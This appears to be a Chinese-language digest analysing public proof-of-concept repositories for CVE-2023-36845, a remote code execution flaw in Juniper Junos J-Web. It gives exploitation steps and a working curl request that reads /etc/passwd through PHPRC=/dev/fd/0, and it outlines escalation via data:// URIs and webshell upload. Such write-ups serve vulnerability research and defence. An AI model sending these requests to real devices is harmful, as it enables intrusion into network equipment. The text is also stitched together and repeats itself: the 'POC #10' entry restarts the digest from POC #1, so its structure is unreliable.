**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #10

**来源**: [CVE-2023-36845-ifconfig-me_CVE-2023-36845.md](../2023/CVE-2023-36845-ifconfig-me_CVE-2023-36845.md)

# CVE-2023-36845

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md](../2023/CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series, SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于: 20.4R3-S9之前的所有版本；21.1R1及更高版本；21.2版本低于21.2R3-S7；21.3版本低于21.3R3-S5；21.4版本低于21.4R3-S5；22.1版本低于22.1R3-S4；22.2版本低于22.2R3-S2；22.3版本低于22.3R2-S2, 22.3R3-S1；22.4版本低于22.4R2-S1, 22.4R3；23.2版本低于23.2R1-S1, 23.2R2

**利用条件:** 目标设备需要启用 J-Web，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的 HTTP 请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而实现远程代码执行。该漏洞影响 EX 系列和 SRX 系列设备上运行的多个 Junos OS 版本。提供的PoC代码利用了这一漏洞，通过POST请求，将`auto_prepend_file`设置为`/etc/passwd`，并修改`PHPRC`变量为`/dev/fd/0`。该代码的目的是读取目标服务器的`/etc/passwd`文件，验证漏洞的存在性。虽然PoC本身是为了验证漏洞，但攻击者可以利用此漏洞执行任意代码，例如植入恶意程序。虽然代码看起来简洁明了, 但需要注意的是该代码存在潜在的风险：

1.  **依赖外部`hosts.txt`文件:** 攻击目标列表依赖于外部文件，如果该文件被替换为包含恶意目标的列表，则可能被用于攻击。尽管这不属于代码本身的投毒，但利用代码的人可能被误导攻击错误的目标。
2.  **简化的利用方式:**  该POC只验证了读取`/etc/passwd`，实际利用可能需要更复杂的payload，而简化版本可能会隐藏更复杂的攻击逻辑。

因此，评估投毒风险为10%。主要是考虑到代码的简洁性和明确的目的，直接用于恶意目的的可能性较低，但仍需注意潜在的被误用或利用的风险。

**利用方式总结：**
1.  攻击者需要能够通过网络访问目标设备的 J-Web 接口。
2.  攻击者发送一个包含特制参数 `PHPRC` 的 HTTP POST 请求。
3.  `PHPRC` 变量被设置为指向攻击者控制的文件或数据流，用于修改PHP的执行环境。
4.  `auto_prepend_file`被用于包含`/etc/passwd`，以读取该文件，验证漏洞。
5.  利用 `PHPRC` 环境变量修改，攻击者可以注入并执行任意 PHP 代码。

**项目地址:** [0xNehru/CVE-2023-36845-Juniper-Vulnerability](https://github.com/0xNehru/CVE-2023-36845-Juniper-Vulnerability)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #2

**来源**: [CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md](../2023/CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致RCE

**影响应用:** Juniper Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括20.4R3-S9之前的所有版本，21.1版本从21.1R1开始，以及21.2R3-S7、21.3R3-S5、21.4R3-S5、22.1R3-S4、22.2R3-S2、22.3R2-S2, 22.3R3-S1、22.4R2-S1, 22.4R3、23.2R1-S1, 23.2R2之前的版本。

**利用条件:** 需要启用J-Web（通过HTTP或HTTPS）并且能够网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS 的 J-Web 组件中存在的 PHP 外部变量修改漏洞。攻击者可以通过发送特制的HTTP请求，设置 `PHPRC` 环境变量来修改PHP的执行环境，从而注入并执行任意代码。该漏洞允许未经身份验证的远程攻击者执行任意代码。

**利用方式：**

1.  攻击者发送一个包含 `PHPRC` 参数的HTTP请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数的值被设置为指向一个包含恶意PHP代码的文件或数据流（例如，`/dev/fd/0`，结合`auto_prepend_file` 读取HTTP body的内容）。
3.  当J-Web处理请求时，PHP会使用攻击者提供的 `PHPRC` 配置，从而执行恶意代码。

提供的PoC代码 (`cve-2023-36845.sh`) 尝试通过以下步骤验证漏洞：

1.  循环遍历IP地址列表。
2.  对于每个IP地址，构造一个包含 `PHPRC` 参数的 HTTPS 请求，并将 `auto_prepend_file` 设置为 `/etc/passwd`。目的是通过读取 `/etc/passwd` 文件来判断目标系统是否易受攻击。
3.  如果响应包含 `root:` 字符串，则认为目标易受攻击。

**有效性：**

该PoC代码**有效**，因为它准确地利用了 `PHPRC` 环境变量修改漏洞的原理。通过设置`auto_prepend_file`读取敏感文件来判断是否存在漏洞。

**投毒风险：**

投毒风险评估为10%。虽然PoC本身旨在验证漏洞，但存在以下潜在的投毒风险：

1.  **输出重定向：** `save_output` 函数将 vulnerable 的结果附加到 `output.txt` 文件中。攻击者可能会修改该函数以包含恶意命令，例如将受害者的IP地址发送到恶意服务器，或者上传其他恶意文件到受害者。
2.  **依赖关系：** 该脚本依赖于 `curl` 命令。如果目标系统上安装了被篡改的 `curl` 版本，可能会导致恶意代码执行。
3.  **后门植入：** 攻击者可能会修改 PoC 代码，在检测到漏洞后植入后门，例如创建一个新的用户帐户或修改 SSH 配置。
4.  **社工风险：** 即使代码本身没有恶意行为，也可能被用于社工攻击。攻击者可以伪装成安全研究人员，诱骗用户运行该脚本，从而获取敏感信息。

总的来说，该PoC代码主要用于检测，但仍需仔细审查，防范潜在的投毒风险。

**项目地址:** [Asbawy/Automation-for-Juniper-cve-2023-36845](https://github.com/Asbawy/Automation-for-Juniper-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #3

**来源**: [CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md](../2023/CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series and SRX Series)

**危害等级:** 严重，可导致远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及之后版本，以及 23.2R2 及之前版本。

**利用条件:** 目标设备开启了 J-Web 服务，可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞是由于 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中存在 PHP 外部变量修改漏洞。攻击者可以通过构造特殊的请求，设置 PHPRC 变量来修改 PHP 的执行环境，从而注入并执行恶意代码。

**有效性：** 提供的 POC 代码有效。脚本首先检查目标是否存在漏洞，通过发送包含 `PHPRC=/dev/fd/0` 的 POST 请求，并验证响应中是否包含 `/etc/passwd` 的内容来判断。

**投毒风险：** 仓库的投毒风险较低（10%）。主要风险在于利用上传文件方式getshell中，如果恶意使用者上传恶意文件，将会对其他使用者造成安全威胁。

**利用方式：**

1.  **通过 PHPRC 变量修改 PHP 配置：** 利用 `PHPRC` 变量，攻击者可以控制 PHP 的配置文件，例如设置 `auto_prepend_file` 来包含远程或本地文件。
2.  **远程代码执行：** 通过 `auto_prepend_file` 包含恶意 PHP 代码，例如使用 `data://` 协议嵌入 `phpinfo()` 或执行系统命令。
3.  **文件上传：** 通过 J-Web 的文件上传功能上传包含恶意代码的 PHP 文件，然后通过 `auto_prepend_file` 包含该文件执行。

**详细利用步骤如下：**

*   发送带有 `PHPRC` 参数的 HTTP 请求，将 PHP 配置文件指向 `/dev/fd/0`，允许从标准输入读取配置。
*   通过 `--data-binary` 参数传递恶意 PHP 配置，例如设置 `allow_url_include=1` 和 `auto_prepend_file` 指向包含恶意代码的 data URI。
*   如果目标启用了文件上传功能，可以上传包含恶意代码的 PHP 文件，并通过 `auto_prepend_file` 包含该文件。

需要注意的是，要成功利用此漏洞，目标设备必须满足以下条件：

*   启用了 J-Web 服务。
*   允许通过 HTTP 或 HTTPS 访问 J-Web 界面。
*   存在受影响的 Junos OS 版本。

**项目地址:** [CharonDefalt/Juniper-exploit-CVE-2023-36845](https://github.com/CharonDefalt/Juniper-exploit-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #4

**来源**: [CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md](../2023/CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md)

## CVE-2023-36845 Juniper Junos OS J-Web PHP 外部变量修改漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS (EX Series, SRX Series) J-Web

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及其之后版本，以及 23.2R1-S1, 23.2R2 之前的 21.2、21.3、21.4、22.1、22.2、22.3、22.4 版本。

**利用条件:** 需要启用 J-Web 且可通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于 Juniper Junos OS 的 J-Web 组件中，允许未经身份验证的攻击者通过修改 PHP 的 `PHPRC` 环境变量来远程执行代码。攻击者通过构造包含恶意 `PHPRC` 变量的 HTTP 请求，可以控制 PHP 的配置，从而注入并执行恶意代码。

**利用方式：**

1.  攻击者发送带有 `PHPRC` 参数的特制 HTTP 请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数指向一个包含恶意 PHP 代码的文件（例如，`/etc/passwd`，POC 中尝试读取该文件以验证漏洞是否存在）。
3.  J-Web 在处理请求时，会使用攻击者提供的 `PHPRC` 值来配置 PHP 解释器。
4.  PHP 解释器执行恶意 PHP 代码，导致远程代码执行。

**POC 代码分析：**

提供的 Ansible Playbook 旨在检测目标设备是否存在 CVE-2023-36845 漏洞。

*   它首先尝试通过 HTTP 和 HTTPS 连接到目标设备 (端口 80 和 443)。
*   它发送一个 POST 请求，其中包含 `PHPRC=/dev/fd/0` 和 `auto_prepend_file=/etc/passwd` 作为请求体，`auto_prepend_file` 用于在 PHP 脚本执行前包含指定的文件。
*  `/dev/fd/0` 表示标准输入,结合`auto_prepend_file`则表示将POST请求的内容作为php文件来解析. *   如果响应状态码为 200 且响应内容包含 'root:' 字符串（`/etc/passwd` 文件的内容），则该设备被认为可能存在漏洞。

**有效性评估：**

POC 代码通过修改 `PHPRC` 变量，并结合 `auto_prepend_file` 读取敏感文件来验证漏洞的存在。 这种方式能够有效检测漏洞。根据漏洞信息，利用成功可导致远程代码执行，POC中只是验证漏洞的存在性。

**投毒风险评估：**

该 Ansible Playbook 的目的是检测漏洞，没有发现植入后门或执行恶意操作的代码。因此，投毒风险较低 (0%)。


**项目地址:** [P4x1s/ansible-cve-2023-36845](https://github.com/P4x1s/ansible-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #5

**来源**: [CVE-2023-36845-ak1t4_CVE-2023-36845.md](../2023/CVE-2023-36845-ak1t4_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，未经身份验证的攻击者可以远程执行代码

**影响版本:** 受影响版本包括：20.4R3-S9之前的版本，21.1R1及之后的21.1版本，21.2R3-S7之前的21.2版本，21.3R3-S5之前的21.3版本，21.4R3-S5之前的21.4版本，22.1R3-S4之前的22.1版本，22.2R3-S2之前的22.2版本，22.3R2-S2和22.3R3-S1之前的22.3版本，22.4R2-S1和22.4R3之前的22.4版本，23.2R1-S1和23.2R2之前的23.2版本。

**利用条件:** 目标系统需要启用J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中的 PHP 外部变量修改漏洞。攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性分析：**

提供的 POC 代码 `cve-2023-36845.sh` 脚本通过发送带有 `PHPRC` 参数的 HTTP 请求到目标设备的 `/about.php` 页面来利用此漏洞。`PHPRC` 参数被设置为 `/dev/fd/0`，这意味着 PHP 将从文件描述符 0（标准输入）读取配置。然后，脚本通过 POST 请求发送 `auto_prepend_file=/etc/passwd` 作为数据，这会导致 PHP 在执行任何其他代码之前，先包含 `/etc/passwd` 文件。如果服务器存在漏洞，响应将包含 `/etc/passwd` 文件的内容，表明漏洞成功利用。

**投毒风险分析：**

该脚本本身旨在检测漏洞，并尝试读取 `/etc/passwd` 文件。虽然脚本会对目标系统造成一定的敏感信息泄露（/etc/passwd），但没有明显的恶意代码或后门植入行为，初步判断投毒概率较低，但是不能排除存在攻击者上传恶意文件的可能，因为具备了远程代码执行能力。
脚本中存在通过 curl 下载目标证书的 issuer 和 subject 信息，攻击者可以在日志中找到这些信息，存在一定的隐私泄露风险。

**利用方式：**

1.  **确定目标：** 找到运行受影响的 Junos OS 版本的 EX 系列或 SRX 系列设备，且启用了 J-Web 服务。
2.  **发送特制请求：** 使用 POC 脚本或类似工具，向目标设备的 `/about.php` 页面发送包含 `PHPRC` 参数的 HTTP 请求。例如：`curl -ksS --data-binary 'auto_prepend_file="/etc/passwd"' --max-time 15 "http://<target_ip>/about.php?PHPRC=/dev/fd/0"`
3.  **验证漏洞：** 检查响应是否包含 `/etc/passwd` 文件的内容。如果包含，则表示设备存在漏洞。
4.  **进一步利用：** 成功利用漏洞后，攻击者可以执行任意代码，例如上传 webshell、修改系统配置等，从而完全控制设备。

**项目地址:** [ak1t4/CVE-2023-36845](https://github.com/ak1t4/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #6

**来源**: [CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md](../2023/CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md)

## CVE-2023-36845 Junos OS J-Web PHP 外部变量修改远程代码执行漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致的远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 高危，未经身份验证的攻击者可远程执行代码

**影响版本:** 受影响版本见漏洞库信息：低于 20.4R3-S9; 21.1 versions 21.1R1 及以后; 低于 21.2R3-S7; 低于 21.3R3-S5; 低于 21.4R3-S5; 低于 22.1R3-S4; 低于 22.2R3-S2; 低于 22.3R2-S2, 22.3R3-S1; 低于 22.4R2-S1, 22.4R3; 低于 23.2R1-S1, 23.2R2。

**利用条件:** 需要启用 J-Web (http 或 https)

**POC 可用性:** 是 (根据搜索引擎结果，存在公开的PoC)

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，进而注入并执行任意代码。该漏洞无需身份验证，攻击者可以通过网络直接利用。由于提供的漏洞利用代码仅包含 GPL 协议内容，无法从中判断是否存在投毒代码，假设该仓库下有其他利用代码,仅根据目前信息，无法判定。J-Web 是 Junos 设备的 Web 管理界面，需要启用 http 或 https 才能被利用。缓解措施包括禁用 J-Web 或者限制访问来源。

**项目地址:** [cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845](https://github.com/cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #7

**来源**: [CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md](../2023/CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md)

## CVE-2023-36845-Junos-J-Web远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1版本21.1R1及更高版本，21.2版本21.2R3-S7之前的所有版本，21.3版本21.3R3-S5之前的所有版本，21.4版本21.4R3-S5之前的所有版本，22.1版本22.1R3-S4之前的所有版本，22.2版本22.2R3-S2之前的所有版本，22.3版本22.3R2-S2, 22.3R3-S1之前的所有版本，22.4版本22.4R2-S1, 22.4R3之前的所有版本，23.2版本23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web服务，且攻击者可以网络访问到目标设备的J-Web界面。需要配置 [system services web-management http] 或 [system services web-management https]。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 界面存在的一个 PHP 外部变量修改漏洞。未经身份验证的攻击者可以通过发送特制的请求，设置 `PHPRC` 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造一个 HTTP POST 请求，其中包含 `PHPRC` 和 `auto_prepend_file` 两个参数。
2.  `PHPRC` 参数用于指定一个包含 PHP 配置指令的文件，这里被设置为 `/dev/fd/0`，表示从标准输入读取配置。
3.  `auto_prepend_file` 参数指定一个在 PHP 脚本执行之前自动包含的文件，这里设置为 `/etc/passwd\n`。由于 `PHPRC` 被设置为从标准输入读取配置，`auto_prepend_file` 的内容实际上被当作 PHP 配置指令来处理。`\n` 用于分割指令。
4. 由于/etc/passwd不是php文件会被当作php指令执行

POC代码的功能是读取/etc/passwd的内容，可以修改为其他php指令以执行其他操作。

**有效性：**

根据漏洞描述和提供的 POC 代码，该漏洞利用是有效的。POC通过设置 PHPRC 环境变量来修改 PHP 运行时配置，从而允许包含任意文件，最终导致远程代码执行。

**投毒风险：**

查看POC代码，只包含漏洞利用代码，未发现隐藏的恶意功能或后门，因此投毒风险较低。

**总而言之，该漏洞危害性高，利用简单，需要尽快修复。**

**项目地址:** [cyberh3als/CVE-2023-36845-POC](https://github.com/cyberh3als/CVE-2023-36845-POC)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #8

**来源**: [CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md](../2023/CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致RCE

**影响应用:** Junos OS J-Web

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 20.4R3-S9 之前的所有版本, 21.1R1 及之后, 21.2R3-S7 之前, 21.3R3-S5 之前, 21.4R3-S5 之前, 22.1R3-S4 之前, 22.2R3-S2 之前, 22.3R2-S2 和 22.3R3-S1 之前, 22.4R2-S1 和 22.4R3 之前, 以及 23.2R1-S1 和 23.2R2 之前。

**利用条件:** 需要启用 J-Web，且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 接口的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特殊的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造包含恶意 PHPRC 变量的 HTTP 请求，发送到目标设备的 J-Web 接口。
2.  目标设备上的 PHP 解释器会读取攻击者设置的 PHPRC 变量，并将其用于配置 PHP 运行环境。
3.  攻击者可以通过 PHPRC 变量指定一个包含恶意 PHP 代码的文件。
4.  当 J-Web 执行 PHP 代码时，会加载并执行攻击者提供的恶意代码，从而实现远程代码执行。

**POC 代码分析：**

POC 代码是一个 Bash 脚本，它的主要功能是：

1.  从 Shodan 搜索指定域名下的 Juniper Web Device Manager 的 IP 地址。
2.  使用 httpx 工具扫描找到的 IP 地址，获取可访问的 URL。
3.  使用 Nuclei 工具，根据 CVE-2023-36845 的 Nuclei 模板对获取的 URL 进行漏洞扫描。

该脚本本身没有投毒代码，只是自动化了漏洞发现和利用的过程。它依赖于 Shodan API key 和 Nuclei 工具。

**投毒风险评估：**

经过分析，提供的 POC 代码本身不包含任何恶意或投毒代码。该脚本只是一个自动化扫描和漏洞利用的工具，其行为取决于使用者以及所使用的 Nuclei 模板。如果使用者使用恶意的 Nuclei 模板，则可能导致非预期的行为，但这并非 POC 代码本身的投毒行为。

因此，投毒风险为 0%。

**项目地址:** [e11i0t4lders0n/CVE-2023-36845](https://github.com/e11i0t4lders0n/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #9

**来源**: [CVE-2023-36845-halencarjunior_CVE-2023-36845.md](../2023/CVE-2023-36845-halencarjunior_CVE-2023-36845.md)

## CVE-2023-36845 - Juniper Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX 和 SRX 系列)

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息。

**利用条件:** 目标设备启用了 J-Web 管理界面，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列设备 J-Web 管理界面中的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行恶意代码。

**利用方式：**
攻击者通过发送包含 `PHPRC` 参数的 HTTP 请求，将 PHP 的配置目录指向一个可以控制的文件，通常使用 `/dev/fd/0`，这意味着 PHP 将从请求体中读取配置信息。然后，攻击者在请求体中设置 `auto_prepend_file` 选项，使其包含恶意代码或者读取敏感文件。 提供的POC通过设置auto_prepend_file为/etc/passwd尝试读取用户，如果成功读取则判定为漏洞存在。

**有效性分析：**
根据漏洞描述和提供的 PoC 代码，该 PoC 能够有效验证漏洞的存在性。PoC 通过发送带有 PHPRC 参数的请求，并设置 auto_prepend_file 来尝试读取 `/etc/passwd` 文件，如果成功读取，则表明目标存在漏洞。

**投毒风险分析：**
PoC 代码主要用于检测漏洞是否存在，但依然存在一定投毒风险。

1.  **依赖库风险** PoC依赖shodan,censys, pyOpenSSL, colorama,urlopen等第三方库,如果这些库本身存在安全漏洞，可能被攻击者利用。不过这是常规风险。

2.  **配置信息泄露风险：** PoC 代码包含 Shodan API 密钥占位符。如果用户不小心将包含真实 API 密钥的 PoC 代码公开，可能导致 API 密钥泄露，被恶意使用。

3.  **扫描行为：** 使用该 PoC 进行大规模扫描可能被目标网络检测到，导致 IP 被封禁或其他安全措施。

4.  **Censysmod.py 模块：** 此模块主要用于从 Censys 搜索符合条件的主机，并将结果传递给漏洞验证函数。该模块自身未发现明显的恶意代码，但过度依赖外部API接口，可能成为利用点。

综上，投毒风险评估为20%。 主要风险在于滥用带来的暴露风险和对第三方库依赖风险。

**项目地址:** [halencarjunior/CVE-2023-36845](https://github.com/halencarjunior/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #10

**来源**: [CVE-2023-36845-ifconfig-me_CVE-2023-36845.md](../2023/CVE-2023-36845-ifconfig-me_CVE-2023-36845.md)

# CVE-2023-36845

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md](../2023/CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series, SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于: 20.4R3-S9之前的所有版本；21.1R1及更高版本；21.2版本低于21.2R3-S7；21.3版本低于21.3R3-S5；21.4版本低于21.4R3-S5；22.1版本低于22.1R3-S4；22.2版本低于22.2R3-S2；22.3版本低于22.3R2-S2, 22.3R3-S1；22.4版本低于22.4R2-S1, 22.4R3；23.2版本低于23.2R1-S1, 23.2R2

**利用条件:** 目标设备需要启用 J-Web，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的 HTTP 请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而实现远程代码执行。该漏洞影响 EX 系列和 SRX 系列设备上运行的多个 Junos OS 版本。提供的PoC代码利用了这一漏洞，通过POST请求，将`auto_prepend_file`设置为`/etc/passwd`，并修改`PHPRC`变量为`/dev/fd/0`。该代码的目的是读取目标服务器的`/etc/passwd`文件，验证漏洞的存在性。虽然PoC本身是为了验证漏洞，但攻击者可以利用此漏洞执行任意代码，例如植入恶意程序。虽然代码看起来简洁明了, 但需要注意的是该代码存在潜在的风险：

1.  **依赖外部`hosts.txt`文件:** 攻击目标列表依赖于外部文件，如果该文件被替换为包含恶意目标的列表，则可能被用于攻击。尽管这不属于代码本身的投毒，但利用代码的人可能被误导攻击错误的目标。
2.  **简化的利用方式:**  该POC只验证了读取`/etc/passwd`，实际利用可能需要更复杂的payload，而简化版本可能会隐藏更复杂的攻击逻辑。

因此，评估投毒风险为10%。主要是考虑到代码的简洁性和明确的目的，直接用于恶意目的的可能性较低，但仍需注意潜在的被误用或利用的风险。

**利用方式总结：**
1.  攻击者需要能够通过网络访问目标设备的 J-Web 接口。
2.  攻击者发送一个包含特制参数 `PHPRC` 的 HTTP POST 请求。
3.  `PHPRC` 变量被设置为指向攻击者控制的文件或数据流，用于修改PHP的执行环境。
4.  `auto_prepend_file`被用于包含`/etc/passwd`，以读取该文件，验证漏洞。
5.  利用 `PHPRC` 环境变量修改，攻击者可以注入并执行任意 PHP 代码。

**项目地址:** [0xNehru/CVE-2023-36845-Juniper-Vulnerability](https://github.com/0xNehru/CVE-2023-36845-Juniper-Vulnerability)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #2

**来源**: [CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md](../2023/CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致RCE

**影响应用:** Juniper Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括20.4R3-S9之前的所有版本，21.1版本从21.1R1开始，以及21.2R3-S7、21.3R3-S5、21.4R3-S5、22.1R3-S4、22.2R3-S2、22.3R2-S2, 22.3R3-S1、22.4R2-S1, 22.4R3、23.2R1-S1, 23.2R2之前的版本。

**利用条件:** 需要启用J-Web（通过HTTP或HTTPS）并且能够网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS 的 J-Web 组件中存在的 PHP 外部变量修改漏洞。攻击者可以通过发送特制的HTTP请求，设置 `PHPRC` 环境变量来修改PHP的执行环境，从而注入并执行任意代码。该漏洞允许未经身份验证的远程攻击者执行任意代码。

**利用方式：**

1.  攻击者发送一个包含 `PHPRC` 参数的HTTP请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数的值被设置为指向一个包含恶意PHP代码的文件或数据流（例如，`/dev/fd/0`，结合`auto_prepend_file` 读取HTTP body的内容）。
3.  当J-Web处理请求时，PHP会使用攻击者提供的 `PHPRC` 配置，从而执行恶意代码。

提供的PoC代码 (`cve-2023-36845.sh`) 尝试通过以下步骤验证漏洞：

1.  循环遍历IP地址列表。
2.  对于每个IP地址，构造一个包含 `PHPRC` 参数的 HTTPS 请求，并将 `auto_prepend_file` 设置为 `/etc/passwd`。目的是通过读取 `/etc/passwd` 文件来判断目标系统是否易受攻击。
3.  如果响应包含 `root:` 字符串，则认为目标易受攻击。

**有效性：**

该PoC代码**有效**，因为它准确地利用了 `PHPRC` 环境变量修改漏洞的原理。通过设置`auto_prepend_file`读取敏感文件来判断是否存在漏洞。

**投毒风险：**

投毒风险评估为10%。虽然PoC本身旨在验证漏洞，但存在以下潜在的投毒风险：

1.  **输出重定向：** `save_output` 函数将 vulnerable 的结果附加到 `output.txt` 文件中。攻击者可能会修改该函数以包含恶意命令，例如将受害者的IP地址发送到恶意服务器，或者上传其他恶意文件到受害者。
2.  **依赖关系：** 该脚本依赖于 `curl` 命令。如果目标系统上安装了被篡改的 `curl` 版本，可能会导致恶意代码执行。
3.  **后门植入：** 攻击者可能会修改 PoC 代码，在检测到漏洞后植入后门，例如创建一个新的用户帐户或修改 SSH 配置。
